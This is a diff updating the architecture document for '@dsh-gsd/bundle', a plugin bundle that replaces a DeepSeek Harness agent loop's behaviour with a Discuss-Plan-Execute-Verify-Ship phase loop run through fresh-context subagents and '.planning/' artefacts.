@@ -1,272 +1,385 @@
-<!-- refreshed: 2026-08-22 -->
+<!-- refreshed: 2026-08-23 -->
 # Architecture
 
-**Analysis Date:** 2026-08-22
+**Analysis Date:** 2026-08-23
+
+`@dsh-gsd/bundle` is a DeepSeek Harness **bundle** — a set of host-plane Cordis
+plugins packaged as subpath exports of one ESM package — that reimplements
+[opengsd-core](https://github.com/open-gsd/gsd-core) (Git Ship Done) and
+**replaces the default agent-loop behaviour** with the GSD phase loop:
+
+```
+Discuss → (UI design, optional) → Plan → Execute → Verify → Ship
+```
+
+It is NOT a standalone application. It runs **inside a DeepSeek Harness (DSH)
+session** (the host runtime). The mechanical turn machine in
+`@deepseek-ai/dsh-agent-loop` (tool scheduling, context assembly, session
+prep) stays — that is DSH's core. This bundle replaces the agent loop's
+*behaviour*: the persona every session reads, the runtime context that
+orients each step, and the `gsd_*` phase tools that drive the loop.
 
 ## System Overview
 
-```text
-┌───────────────────────────────────────────────────────────────────────────┐
-│                      DSH HOST (DeepSeek Harness / Cordis)                  │
-│  @deepseek-ai/dsh-agent-loop (turn machine) · subagents (spawn provider)   │
-│  tools · commands · fs · systemPrompt — kept, not reimplemented            │
-└───────────────┬───────────────────────────────────────────────────────────┘
-                │ cordis.patch.yml (override agent-loop + insert 11 rows)
+```
+                      DeepSeek Harness (host) session
+ ┌──────────────────────────────────────────────────────────────────────┐
+ │  cordis.patch.yml (cordis.patch.yml)                                  │
+ │   ├─ override row agent-loop → config.agents: [{ id: gsd }]           │
+ │   └─ insert rows: gsd-persona, gsd-state, gsd-core-tools,            │
+ │       gsd-discuss, gsd-plan, gsd-execute, gsd-verify, gsd-ship,        │
+ │       gsd-ui, gsd-quick, gsd-map-codebase, gsd-commands                │
+ │                                                                       │
+ │  host Cordis context (ctx):                                           │
+ │   services → systemPrompt, tools, commands, fs, subagents             │
+ │   DI       → ctx.get / ctx.provide / ctx.effect / ctx.inject            │
+ │                                                                       │
+ │  ┌───────────── gsd-persona (lib/persona.js) ──────────────┐         │
+ │  │ systemPrompt.section("gsd:persona", order -100, text)     │         │
+ │  │ systemPrompt.context("gsd:state", order 10, provider)     │         │
+ │  │   provider reads gsdState.cachedState(cwd) sync            │         │
+ │  └────────────────────────────┬───────────────────────────┘         │
+ │                               │ ctx.get("gsdState")                  │
+ │  ┌──────────── gsd-state (lib/state.js) ────────────────┐            │
+ │  │ class GsdState — published as ctx.provide("gsdState") │            │
+ │  │ reads/writes `.planning/` artefacts via ctx.fs         │            │
+ │  │ in-memory cache _cache: cwd → {state, roadmap, ts}     │            │
+ │  └────────────────────────────┬───────────────────────────┘            │
+ │                               │ every phase tool calls ctx.get("gsdState")
+ │  ┌─────── phase tools (lib/{core-tools,discuss,plan,execute,verify,   │
+ │  │        ship,ui,quick,map-codebase}.js) ──────────────────────────  │
+ │  │  ctx.tools.register(defineTool({name:"gsd_*", execute}))           │
+ │  │  spawn fresh-context subagents via ctx.get("subagents").start(...) │
+ │  │  helpers: lib/_runner.js (spawnSubagent, planningContext, cwdOf)   │
+ │  │           lib/_agents.js (role prompts: RESEARCHER/PLANNER/...)     │
+ │  │           lib/_shared.js (frontmatter, roadmap, slug helpers)      │
+ │  └──────────────────────────────────────────────────────────────────  │
+ │                                                                       │
+ │  ┌──── gsd-commands (lib/commands.js) ──────┐                         │
+ │  │ ctx.commands.register("/gsd-*")           │                         │
+ │  │ thin routers → inject user msg → agent    │                         │
+ │  │ runs the matching gsd_* tool              │                         │
+ │  └───────────────────────────────────────────┘                         │
+ └──────────────────────────────────────────────────────────────────────┘
+                │ spawns (fresh-context, in-process `spawn` provider)
                 ▼
-┌───────────────────────────────────────────────────────────────────────────┐
-│                         @dsh-gsd/bundle — GSD phase loop                   │
-│                                                                            │
-│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐                  │
-│  │  Persona      │  │  State svc    │  │ Core tools    │                  │
-│  │ lib/persona.js│  │ lib/state.js  │  │ lib/core-tools│                  │
-│  │ gsd:persona   │  │  →gsdState    │  │ init/status/  │                  │
-│  │ gsd:state ctx │  │  .planning/*  │  │ progress/mstn │                  │
-│  └──────┬────────┘  └──────┬────────┘  └───────┬───────┘                  │
-│         └─────────────┬────┴───────────────────┘                          │
-│                       ▼                                                   │
-│  ┌────────────────────────────────────────────────────────────────────┐  │
-│  │            Phase loop (one gsd_* tool per step)                     │  │
-│  │  discuss ─► (ui) ─► plan ─► execute ─► verify ─► ship              │  │
-│  │ lib/discuss.js  lib/ui.js  lib/plan.js  lib/execute.js              │  │
-│  │ lib/verify.js  lib/ship.js · + lib/quick.js (sub-threshold)         │  │
-│  └───────────────────────┬────────────────────────────────────────────┘  │
-│                          │ spawn fresh-context subagents                 │
-│                          ▼                                               │
-│  ┌────────────────────────────────────────────────────────────────────┐  │
-│  │ Shared infra:  lib/_shared.js (schemas)  lib/_runner.js (subagent) │  │
-│  │                lib/_agents.js (role prompts)                       │  │
-│  └────────────────────────────────────────────────────────────────────┘  │
-│                          │                                               │
-│                          ▼                                               │
-│  lib/commands.js — /gsd-* slash-command routers → inject user message   │
-└───────────────────────────────┬───────────────────────────────────────────┘
-                                │
-                                ▼
-        ┌───────────────────────────────────────────┐
-        │  On-disk state: .planning/                │
-        │  PROJECT.md ROADMAP.md REQUIREMENTS.md     │
-        │  STATE.md config.json phases/<NN>-<slug>/  │
-        │  quick/<YYYYMMDD>-<slug>/                  │
-        └───────────────────────────────────────────┘
+   fresh-context subagents (researcher, planner, plan-checker,
+     executor, verifier, ui-researcher, ui-checker, codebase-mapper)
+        each gets a <planning_context> block + role prompt,
+        writes artefacts directly to `.planning/`, returns a short result.
 ```
 
-The bundle is not standalone: every module is a Cordis plugin `{ name, inject, apply }` registered in `cordis.patch.yml`, running inside the DSH host Node process. The mechanical agent turn loop stays in `@deepseek-ai/dsh-agent-loop`; the bundle replaces only its *behaviour* — the persona agents are configured as GSD drivers and the `gsd_*` tools implement the loop steps.
+The orchestrator principle: **the main session stays lean**. Phase tools
+gather inputs from `.planning/`, build a `<planning_context>` block, spawn a
+one-shot fresh-context subagent for the heavy work, then read back the
+artefact the subagent wrote and route to the next step. Phase tools never do
+the research/planning/executing/verifying themselves.
 
 ## Component Responsibilities
 
-| Component | Responsibility | File |
-|-----------|----------------|------|
-| `gsd-persona` | Install phase-loop mental model (systemPrompt section order -100) + live loop-position context provider (order 10) | `lib/persona.js` |
-| `gsd-state` | Publish the `gsdState` host service: `.planning/` artefact manager (STATE/ROADMAP/REQUIREMENTS/config, phase artefacts, plan index, progress, sync cache) | `lib/state.js` |
-| `gsd-core-tools` | Orientation/entry tools: `gsd_init`, `gsd_status`, `gsd_progress`, `gsd_new_milestone` | `lib/core-tools.js` |
-| `gsd-discuss` | `gsd_discuss` — seal CONTEXT.md (7 blocks, D-NN decisions), advance STATE to `plan` | `lib/discuss.js` |
-| `gsd-plan` | `gsd_plan` — researcher → planner → plan-checker fresh-context subagents, ≤3-iteration revision loop, requirements-coverage gate | `lib/plan.js` |
-| `gsd-execute` | `gsd_execute` — dependency-wave grouping, parallel fresh-context executors per plan, atomic commits, SUMMARY.md confirmation, STATE → `verify` | `lib/execute.js` |
-| `gsd-verify` | `gsd_verify` — verifier subagent → VERIFICATION.md, status decision tree routing (passed/gaps_found/human_needed) | `lib/verify.js` |
-| `gsd-ship` | `gsd_ship` — preflight gates (verification passed, clean tree, branch, remote, gh), push, PR body from artefacts, `gh pr create`, STATE + ROADMAP update | `lib/ship.js` |
-| `gsd-ui` | `gsd_ui_phase` — optional UI design step: ui-researcher → UI-SPEC.md, ui-checker | `lib/ui.js` |
-| `gsd-quick` | `gsd_quick` — sub-threshold path: one fresh-context subagent, atomic commit, record under `.planning/quick/` | `lib/quick.js` |
-| `gsd-commands` | `/gsd-*` slash-commands — thin routers injecting a user message that instructs the agent to run the matching `gsd_*` tool | `lib/commands.js` |
-| `_shared` | Frontmatter YAML-subset parse/serialize, slugify, zeroPad, dates, ROADMAP/REQUIREMENTS schemas, block/text helpers | `lib/_shared.js` |
-| `_runner` | `spawnSubagent` (host `subagents` spawn provider), `planningContext` block builder, `cwdOf` | `lib/_runner.js` |
-| `_agents` | The 7 role prompts (researcher, planner, plan-checker, executor, verifier, ui-researcher, ui-checker) | `lib/_agents.js` |
+| Component | File(s) | Responsibility |
+|---|---|---|
+| Persona | `lib/persona.js` | Install the GSD phase-loop system-prompt section (`gsd:persona`, order -100) and the `gsd:state` runtime-context provider that orients every model step at the current `STATE.md` position. |
+| State service | `lib/state.js` | The `gsdState` host service: read/write `.planning/` artefacts (PROJECT/REQUIREMENTS/ROADMAP/STATE/config + per-phase CONTEXT/RESEARCH/PLAN/SUMMARY/VERIFICATION/UI-SPEC), plan indexing, progress counters, in-memory sync cache. |
+| Core tools | `lib/core-tools.js` | `gsd_init`, `gsd_status`, `gsd_progress`, `gsd_new_milestone` — orientation + bootstrap, backed by `gsdState`. |
+| Discuss | `lib/discuss.js` | `gsd_discuss` — seal `CONTEXT.md` (7 blocks, D-NN decisions) + DISCUSSION-LOG, advance STATE to `plan`. |
+| Plan | `lib/plan.js` | `gsd_plan` — orchestrates researcher → planner → plan-checker (3-iteration revision loop), writes RESEARCH.md + PLAN.md files, advances STATE to `execute`. |
+| Execute | `lib/execute.js` | `gsd_execute` — wave-based fresh-context executors, one PLAN.md each, atomic per-task commits, SUMMARY.md, advances STATE to `verify`. |
+| Verify | `lib/verify.js` | `gsd_verify` — spawns verifier, reads VERIFICATION.md status, routes passed/gaps_found/human_needed. |
+| Ship | `lib/ship.js` | `gsd_ship` — preflight gates (verification passed, clean tree, feature branch, remote, `gh`), push, `gh pr create`, `completePhase`. |
+| UI design | `lib/ui.js` | `gsd_ui_phase` (optional) — ui-researcher → UI-SPEC.md, ui-checker verifies. |
+| Quick | `lib/quick.js` | `gsd_quick` — sub-threshold lightweight path: one fresh-context subagent + `.planning/quick/<date>-<slug>/TASK.md`. |
+| Codebase mapper | `lib/map-codebase.js` | `gsd_map_codebase` — parallel fresh-context mappers write 7 docs to `.planning/codebase/`. Brownfield pre-init tool. |
+| Commands | `lib/commands.js` | `/gsd-*` slash-commands: thin routers that inject a user message instructing the agent to run the matching `gsd_*` tool. |
+| Subagent runner | `lib/_runner.js` | `spawnSubagent` (host `subagents` `spawn` provider), `planningContext` (truncate-large-artefact context block), `cwdOf`. |
+| Role prompts | `lib/_agents.js` | The meta-prompts for each fresh-context role (RESEARCHER/PLANNER/PLAN_CHECKER/EXECUTOR/VERIFIER/UI_RESEARCHER/UI_CHECKER/CODEBASE_MAPPER). |
+| Shared helpers | `lib/_shared.js` | YAML-subset frontmatter parse/stringify, ROADMAP/REQUIREMENTS parse/stringify, slug/date helpers, `matchesGapClosure`/`isValidRef`/`isClosedPhase` decision predicates. |
+| Plugin manifest | `cordis.patch.yml` | The bundle patch: overrides the `agent-loop` row config and inserts the GSD plugin rows. |
+| Package manifest | `package.json` | Defines the subpath exports (`@dsh-gsd/bundle/<name>`), `files`, peer dependencies on the host packages. |
 
 ## Pattern Overview
 
-**Overall:** Host-plane Cordis plugin set using the **orchestrator-and-fresh-context-subagent** pattern. Each `gsd_*` tool is a thin orchestrator: it reads artefacts via the `gsdState` service, spawns one-shot clean-context subagents through the host `subagents` `spawn` provider, writes results back into `.planning/`, and advances STATE. Orchestrators never do the heavy work themselves.
+**Overall:** Orchestrator-on-host. Every plugin is a standard DSH/Cordis plugin
+(`export { name, inject, apply }`). `apply(ctx, config)` registers its
+contribution (a tool, a system-prompt section, a host service, or slash
+commands) against host-provided context services. The bundle replaces the
+agent-loop *behaviour* — not the turn machine.
 
-**Key Characteristics:**
-- Every module is a Cordis plugin (`{ name, inject, apply }`); no side effects at import time.
-- The main session stays lean: research, planning, execution, verification all run in fresh ~200k-context subagents (`lib/_runner.js`).
-- `.planning/` on disk is the durable memory and the only cross-session state; STATE.md is the navigation spine read first by every entry point.
-- A plain JS service object (`GsdState`) is shared via `ctx.provide('gsdState', …)` and consumed via `ctx.get('gsdState')` — not a Cordis Service subclass.
-- All orchestration is synchronous in one tool `execute`; subagents are awaited via `Promise.all` per wave (`lib/execute.js`).
+**Key characteristics:**
+
+- **Host-service dependency injection.** Each plugin declares `inject`
+  (`lib/<plugin>.js` top) — the host services it needs:
+  `persona.js` injects `["systemPrompt"]`; `state.js` injects `["fs"]`;
+  every phase tool injects `["gsdState", "tools"]`; `commands.js` injects
+  `["commands"]`. `inject` is resolved by Cordis before `apply` runs.
+- **The `gsdState` service is the shared backbone.** `lib/state.js` publishes
+  it via `ctx.provide("gsdState", svc)` (`lib/state.js:515`). All phase tools
+  reach it through `ctx.get("gsdState")` (the closure `const gsd = () =>
+  ctx.get("gsdState")` idiom at the top of each `apply`).
+- **`defineTool` is the only tool-definition API.** Every model-facing tool is
+  registered as `ctx.tools.register(defineTool({ name, description,
+  parameters, output, execute, presentCall }))` (`defineTool` from
+  `@deepseek-ai/dsh-tools`, `node_modules/@deepseek-ai/dsh-tools/lib/index.js:836`).
+  `parameters` use the dsh-tools value-spec (not raw JSON Schema);
+  `defineTool` compiles them and validates args before `execute` runs.
+- **Fresh-context subagents for heavy work.** The orchestrator (`lib/plan.js`,
+  `lib/execute.js`, `lib/verify.js`, `lib/ui.js`, `lib/quick.js`,
+  `lib/map-codebase.js`) spawns one-shot fresh-context children through the
+  host `subagents` service's in-process `spawn` provider
+  (`lib/_runner.js:8-32`). Subagents get a `<planning_context>` block
+  (`lib/_runner.js:36-46`) + a role prompt from `lib/_agents.js`, then write
+  artefacts directly to `.planning/` and return a short confirmation.
+- **`.planning/` is the durable memory.** Artefact schemas (frontmatter +
+  body) are faithful to opengsd-core. STATE.md is the navigation spine.
+- **Synchronous persona, asynchronous tools.** The persona's runtime-context
+  provider needs a *sync* snapshot, so `GsdState` keeps an in-memory
+  `_cache` (`lib/state.js:37`, `cachedState` at `lib/state.js:496-507`)
+  updated on every artefact write; the phase tools' `execute` paths are async
+  and use the real `ctx.fs`.
 
 ## Layers
 
-**Host integration layer:**
-- Purpose: Declares the plugin set and overrides the host agent-loop behaviour
-- Location: `package.json` (`dsh.bundle.patch`), `cordis.patch.yml`
-- Contains: The `agent-loop` config override (agents: `[gsd]`) and the `insert` block registering the 11 plugin rows with `@dsh-gsd/bundle/<name>` subpaths
-- Depends on: DSH host conventions (row ids `agent-loop`, ordering `-100`)
-- Used by: the DSH plugin loader
+The bundle is a single `lib/` directory; "layers" are roles, not folders.
 
-**Persona / orientation layer:**
-- Purpose: Make every session a GSD driver; orient every step at STATE.md
-- Location: `lib/persona.js`, `lib/core-tools.js`
-- Contains: systemPrompt section + context provider; the 4 orientation tools
-- Depends on: `gsdState` service (optional at registration, resolved at assembly time), `tools` host service
-- Used by: all sessions (persona is injected globally)
+| Layer | Purpose | Location | Contains | Depends on | Used by |
+|---|---|---|---|---|---|
+| **Manifest / wiring** | Declare the plugin rows and override the agent-loop config | `cordis.patch.yml`, `package.json` | plugin row ids + subpath export names | host Cordis loader | the host session boot |
+| **Persona / system prompt** | Frame every session as a GSD phase-loop driver | `lib/persona.js` | `PERSONA_TEXT`, `renderStateContext`, `apply` | `ctx.systemPrompt`, `gsdState` | the model (every turn) |
+| **Host services** | Publish services consumed by tools | `lib/state.js` | `class GsdState` | `ctx.fs` | every phase tool, persona |
+| **Model-facing tools** | One phase step each, callable by the model | `lib/core-tools.js`, `lib/discuss.js`, `lib/plan.js`, `lib/execute.js`, `lib/verify.js`, `lib/ship.js`, `lib/ui.js`, `lib/quick.js`, `lib/map-codebase.js` | `defineTool(...)` registrations | `gsdState`, `tools`, `subagents` (most), `ctx.fs` (indirect) | the model (via tool calls), `/gsd-*` commands |
+| **Slash-commands** | opengsd UX: thin routers to tools | `lib/commands.js` | `COMMANDS` table, `apply` | `ctx.commands`, `@deepseek-ai/dsh-llm` (`createUserMessage`) | the user (chat input) |
+| **Orchestration helpers** | Spawn subagents, build context blocks | `lib/_runner.js` | `spawnSubagent`, `planningContext`, `cwdOf` | `ctx.get("subagents")`, `_shared` | the phase tools |
+| **Role prompts** | Meta-prompts for each fresh-context role | `lib/_agents.js` | `RESEARCHER_PROMPT`, `PLANNER_PROMPT`, `PLAN_CHECKER_PROMPT`, `EXECUTOR_PROMPT`, `VERIFIER_PROMPT`, `UI_RESEARCHER_PROMPT`, `UI_CHECKER_PROMPT`, `CODEBASE_MAPPER_PROMPT` | none (pure string consts) | the phase tools |
+| **Pure helpers** | Frontmatter/roadmap/slug/decision predicates | `lib/_shared.js` | `parseFrontmatter`, `stringifyFrontmatter`, `parseRoadmap`, `parseRequirements`, `slugify`, `zeroPad`, `matchesGapClosure`, `isValidRef`, `isClosedPhase` | none | `state.js`, every phase tool |
+| **Tests** | Deterministic regression cover for helpers + state + tools | `test/*.test.mjs`, `test/helpers/*.mjs` | `node:test` suites + in-memory fake host `fs`/`subagents` | the `lib/` modules under test | the test runner |
 
-**State service layer:**
-- Purpose: Single owner of the `.planning/` schemas and progress bookkeeping
-- Location: `lib/state.js`
-- Contains: `GsdState` class — path helpers, `initProject`, STATE read/write/advance, roadmap/requirements/config IO, phase artefact write/read, `listPlans`/`planIndex`/`markPlanSummary`/`completePhase`, sync cache
-- Depends on: `_shared.js` helpers; host `fs` service
-- Used by: every other plugin (via `ctx.get("gsdState")`) and by `persona.js`'s sync context provider via `cachedState`
-
-**Phase loop layer:**
-- Purpose: One tool per loop step
-- Location: `lib/discuss.js`, `lib/ui.js`, `lib/plan.js`, `lib/execute.js`, `lib/verify.js`, `lib/ship.js`, `lib/quick.js`
-- Contains: `gsd_discuss`, `gsd_ui_phase`, `gsd_plan`, `gsd_execute`, `gsd_verify`, `gsd_ship`, `gsd_quick`
-- Depends on: `gsdState`, host `tools`, `subagents` (via `_runner.js`), `_shared.js`, `_agents.js` prompts
-- Used by: the agent (model-facing tools)
-
-**Command layer:**
-- Purpose: opengsd `/gsd-*` UX alongside natural-language driving
-- Location: `lib/commands.js`
-- Contains: 11 slash-command entries that translate raw input into an injected user-role message + ack
-- Depends on: host `commands` service and `createUserMessage` from `@deepseek-ai/dsh-llm`
-- Used by: session users; the injected message is handled by the persona-driven agent
-
-**Shared infra:**
-- Location: `lib/_shared.js`, `lib/_runner.js`, `lib/_agents.js`
-- Contains: frontmatter/roadmap/requirements schemas; subagent spawn + planning_context assembly; role prompt text
-- Depends on: `lib/_shared.js` (only dependency-free module); `_runner`/`_agents` depend on `_shared`
-- Used by: all plugins
+Dependency direction is strictly downward: manifest → persona/services →
+tools → orchestration helpers / role prompts → pure helpers. No `lib/` module
+imports a phase tool; phase tools import `state.js`, `_runner.js`, `_agents.js`,
+`_shared.js`. `_shared.js` imports nothing. This keeps the core (state,
+helpers) unit-testable with no host.
 
 ## Data Flow
 
-### Primary Request Path (a phase end to end)
+### Primary request path — `gsd_plan` (the canonical orchestration flow)
 
-1. Session begins → `gsd-persona` injects the phase-loop mental model and a `gsd:state` context line computed from `gsdState.cachedState(cwd)` (`lib/persona.js:48-61, 78-89`)
-2. `gsd_init` writes `PROJECT.md`, `REQUIREMENTS.md`, `ROADMAP.md`, `STATE.md`, `config.json` and seeds the cache (`lib/core-tools.js:52-78` → `GsdState.initProject` in `lib/state.js:78-111`)
-3. `gsd_status` reads STATE.md + ROADMAP.md and prints the loop position (`lib/core-tools.js:83-118`)
-4. `gsd_discuss` → the agent holds the decision conversation (via `ask_user_question`), then calls the tool with structured decisions → writes `<NN>-CONTEXT.md` + optional DISCUSSION-LOG.md → `setActivePhase(cwd, N, "plan")` → adds a decision line (`lib/discuss.js:130-137`)
-5. (optional) `gsd_ui_phase` → spawns ui-researcher (writes UI-SPEC.md) then ui-checker → advances STATE to `plan` (`lib/ui.js:38-62`)
-6. `gsd_plan`:
-   - gates: phase not passed-verified; CONTEXT.md exists (`lib/plan.js:47-53`)
-   - researcher subagent → RESEARCH.md (`lib/plan.js:68-85`)
-   - planner subagent → writes `<NN>-<PP>-PLAN.md` files directly (`lib/plan.js:91-107`)
-   - plan-checker subagent → issues string; up to 3 revision loops feeding issues back to the planner (`lib/plan.js:114-131`)
-   - requirements-coverage warning gate, then `setActivePhase(cwd, N, "execute")` + decision (`lib/plan.js:140-153`)
-7. `gsd_execute`:
-   - discovers the plan index via `GsdState.planIndex` (waves, incomplete, runnable with satisfied `depends_on`) (`lib/state.js:392-409`)
-   - groups to-run plans by wave, runs wave in order; per wave, dispatches one executor subagent per plan in `Promise.all` (`lib/execute.js:63-100`)
-   - executor writes code, commits atomically (scope `{base}-{PP}`), writes SUMMARY.md; orchestrator confirms the file, calls `markPlanSummary`, marks REQ-IDs complete (`lib/execute.js:102-112`)
-   - when all plans have summaries → `setActivePhase(cwd, N, "verify")` (`lib/execute.js:124-131`)
-8. `gsd_verify`:
-   - requires all plans have SUMMARY.md (`lib/verify.js:49-50`)
-   - verifier subagent writes VERIFICATION.md (frontmatter `status`/`score`/`gaps`/`human_verification`) (`lib/verify.js:59-75`)
-   - tool re-reads the file's frontmatter and routes: `passed` → STATE step `ship`; else stays `verify` (`lib/verify.js:85-91`)
-9. `gsd_ship`:
-   - preflight gates: VERIFICATION.md `status: passed`, clean working tree, feature branch, `origin` remote, `gh` authenticated (`lib/ship.js:52-72`)
-   - `git push -u origin <branch>`, assemble PR body from plans/summaries/STATE, write temp body file, `gh pr create` (`lib/ship.js:75-129`)
-   - update STATE (`Phase N shipped — PR #X`), `addDecision`, `completePhase` (ROADMAP status + progress percent) (`lib/ship.js:133-138`, `lib/state.js:421-441`)
+The model is a GSD driver (via `gsd:persona`). It calls `gsd_plan` (tool call)
+with `phase: N`. The tool's `execute` (`lib/plan.js:35-156`) runs:
 
-### Sub-threshold path (`gsd_quick`)
+1. **Orient.** `cwdOf(exec)` (`lib/_runner.js:48`) → `cwd`. `ctx.get("gsdState")`
+   (`lib/plan.js:19`). Guard: `s.isProject(cwd)` (`lib/state.js:103`); reject if
+   no `.planning/`.
+2. **Resolve phase.** `s.readRoadmap(cwd)` (`lib/state.js:310`) → find the
+   phase by `args.phase` (`lib/plan.js:41`). Reject if absent. Compute
+   `phaseDir` + `base` (`lib/plan.js:43-44`).
+3. **Closed-phase gate.** If a VERIFICATION.md exists and `isClosedPhase(v)`
+   (`lib/_shared.js:292`) is true, reject unless `args.force`
+   (`lib/plan.js:49-52`).
+4. **CONTEXT.md guard.** Reject if no CONTEXT.md — discuss first
+   (`lib/plan.js:54-55`).
+5. **Load context.** `s.readProject`, `s.readRequirements`, `s.readArtifact(
+   CONTEXT)` (`lib/plan.js:57-60`).
+6. **Set step.** `s.setActivePhase(cwd, phase, "plan")` (`lib/state.js:291`)
+   writes STATE.md.
+7. **Research** (`lib/plan.js:67-87`). If no RESEARCH.md (or `forceResearch`),
+   build the researcher prompt = `RESEARCHER_PROMPT` (`lib/_agents.js:8`) +
+   `planningContext([...])` (`lib/_runner.js:36`) + output path hint, then
+   `spawnSubagent(ctx, exec, { label, promptText })` (`lib/_runner.js:8`).
+   Save the returned `r.output` via `s.writeArtifact(..., "RESEARCH", ...)`
+   (`lib/state.js:370`).
+8. **Plan** (`lib/plan.js:89-113`). Build the planner prompt
+   (`PLANNER_PROMPT` + `planningContext` + mode flags). Spawn the planner.
+   If it returns `## PHASE SPLIT RECOMMENDED`, surface that and stop.
+9. **Verify (revision loop, max 3)** (`lib/plan.js:115-132`). `runChecker`
+   spawns `PLAN_CHECKER_PROMPT`; if it does NOT return
+   `## VERIFICATION PASSED`, re-spawn the planner with the checker's issues
+   and re-run the checker, up to 3 iterations.
+10. **Requirements coverage gate** (`lib/plan.js:134-139`). Cross-check every
+    phase REQ-ID is covered by ≥1 plan's `requirements` frontmatter.
+11. **Advance STATE.** `setStep("execute")` + `s.addDecision(...)`
+    (`lib/state.js:265`). Return the wave plan + any uncovered requirements.
 
-1. `gsd_quick` computes `cwd` + slug dir `.planning/quick/<YYYYMMDD>-<slug>` (`lib/quick.js:39-40`)
-2. spawns one executor subagent with the QUICK_PROMPT (`lib/quick.js:42`)
-3. writes TASK.md into the dir and appends a decision line (`lib/quick.js:55-58`)
+The same orchestrator shape (orient → guard → load context → spawn → read
+back artefact → route) repeats in `gsd_execute` (`lib/execute.js:34-134`),
+`gsd_verify` (`lib/verify.js:28-99`), `gsd_ui_phase` (`lib/ui.js:24-67`), and
+`gsd_map_codebase` (`lib/map-codebase.js:82-201`). `gsd_ship`
+(`lib/ship.js:44-145`) is the exception: it does not spawn a subagent; it runs
+preflight gates against git/gh via `node:child_process.execFileSync`
+(`lib/ship.js:19-30`) and calls `gh pr create`.
 
-### Slash-command path
+### State management
 
-1. User types `/gsd-plan-phase 1` → host `commands` dispatches to the registered handler (`lib/commands.js:161-174`)
-2. Handler builds a text instruction and an ack; `send(invocation.agent, built.text)` pushes a user-role message via `agent.followup(createUserMessage(...))` (`lib/commands.js:24-29`)
-3. The agent (persona-driven) wakes on the followup and calls the matching `gsd_*` tool
-
-**State Management:**
-- Single write owner for all GSD state: the `gsdState` service (`lib/state.js`). Tools mutate only through its methods; the in-memory `_cache` (cwd → {state, roadmap, ts}) is the sync read path for the persona context provider.
-- Artefacts are content-addressed by phase dir `<NN>-<slug>` and suffix: `CONTEXT`, `RESEARCH`, `DISCUSSION-LOG`, `PLAN-<PP>`, `SUMMARY-<PP>`, `VERIFICATION`, `UAT`, `UI-SPEC` — assembled by `writeArtifact`/`readArtifact` (`lib/state.js:326-346`).
-- ROADMAP.md phase table and STATE frontmatter `progress` block hold phase/plan completion counters; `completePhase` recomputes percent (`lib/state.js:421-438`).
+- **Durable state lives on disk under `.planning/`.** Schema:
+  `PROJECT.md`, `REQUIREMENTS.md`, `ROADMAP.md`, `STATE.md`, `config.json`,
+  `phases/<NN>-<slug>/<NN>-CONTEXT.md`, `<NN>-RESEARCH.md`,
+  `<NN>-<PP>-PLAN.md`, `<NN>-<PP>-SUMMARY.md`, `<NN>-VERIFICATION.md`,
+  `<NN>-UI-SPEC.md`, plus `quick/<date>-<slug>/TASK.md` and `codebase/*.md`.
+  See `README.md` § ".planning/ artefacts".
+- **STATE.md is the navigation spine** — YAML frontmatter (machine: `status`,
+  `active_phase`, `next_action`, `progress`, session-continuity fields) +
+  Markdown body (human: position, decisions, blockers, continuity). Round-trips
+  through `parseFrontmatter` + `_parseStateBody` (`lib/state.js:230-249`) and
+  `_stringifyState` (`lib/state.js:193-219`).
+- **The roadmap is the single source of truth for phase progress.**
+  `recomputeProgress` (`lib/state.js:484-493`) and `completePhase`
+  (`lib/state.js:464-481`) recompute `progress.completed_phases` / `percent`
+  from `parseRoadmap`, never from a counter — fixing the drift bugs pinned in
+  `test/state.test.mjs`.
+- **In-memory cache for sync reads.** `GsdState._cache` (`lib/state.js:37`)
+  maps `cwd → { state, roadmap, ts }`. It is refreshed on every `readState`
+  and `writeState` so `cachedState` (`lib/state.js:496-507`) — called
+  synchronously by the persona context provider — never blocks on `ctx.fs`.
+  Cleared on plugin teardown (`lib/state.js:516`).
 
 ## Key Abstractions
 
-**`GsdState` service:**
-- Purpose: the single entry point to all `.planning/` reads/writes; the reference implementation of opengsd-core's artefact schema
-- Examples: `lib/state.js:31-456`; consumed via `ctx.get("gsdState")` in every tool plugin
-- Pattern: plain service object under `ctx.provide('gsdState', …)` with a synchronous `cachedState(cwd)` snapshot for the persona context provider
-
-**`spawnSubagent` + `planningContext`:**
-- Purpose: fresh-context subagent lifecycle + the `<planning_context>` block fed to each role; artefacts truncated at 60k chars to keep the fresh 200k window usable
-- Examples: `lib/_runner.js:8-46`
-- Pattern: single-threaded spawn-and-await; `run.dispose()` in a `finally`
-
-**`defineTool` from `@deepseek-ai/dsh-tools`:**
-- Purpose: every model-facing tool (`gsd_init`, …, `gsd_quick`) is declared with `parameters`, `output`, `execute`, `presentCall`
-- Examples: every `lib/*.js` phase module `apply(ctx)` body
-- Pattern: registration via `ctx.tools.register(defineTool({…}))`; tools resolve `cwd` either via `cwdOf(exec)` or `exec?.agent?.session?.header?.cwd || process.cwd()`
-
-**Role prompts (`lib/_agents.js`):**
-- Purpose: keep the orchestrators minimal — the detailed behaviour lives in the prompt text (opengsd faithful)
-- Examples: `RESEARCHER_PROMPT`, `PLANNER_PROMPT`, `PLAN_CHECKER_PROMPT`, `EXECUTOR_PROMPT`, `VERIFIER_PROMPT`, `UI_RESEARCHER_PROMPT`, `UI_CHECKER_PROMPT`
-- Pattern: pure string constants; the orchestration code composes them with `planningContext(...)` and per-invocation mode lines
+| Abstraction | Purpose | Examples | Pattern |
+|---|---|---|---|
+| **DSH plugin module** | The unit of host integration | `lib/persona.js`, `lib/state.js`, every `lib/<phase>.js` | `export { name, inject, apply }`. `inject` lists required host services; `apply(ctx, config)` registers. |
+| **Host service (`gsdState`)** | Cross-plugin shared state + artefact IO | `lib/state.js` `class GsdState` | Published via `ctx.provide("gsdState", svc)`; consumed via `ctx.get("gsdState")`. Not a Cordis `Service` subclass — a plain object. |
+| **Model-facing tool** | One phase step callable by the model | `gsd_init`, `gsd_discuss`, `gsd_plan`, `gsd_execute`, `gsd_verify`, `gsd_ship`, `gsd_ui_phase`, `gsd_quick`, `gsd_map_codebase`, `gsd_status`, `gsd_progress`, `gsd_new_milestone` | `defineTool({ name, description, parameters, output, execute, presentCall })` → `ctx.tools.register(...)`. Args are validated by `defineTool` before `execute`. |
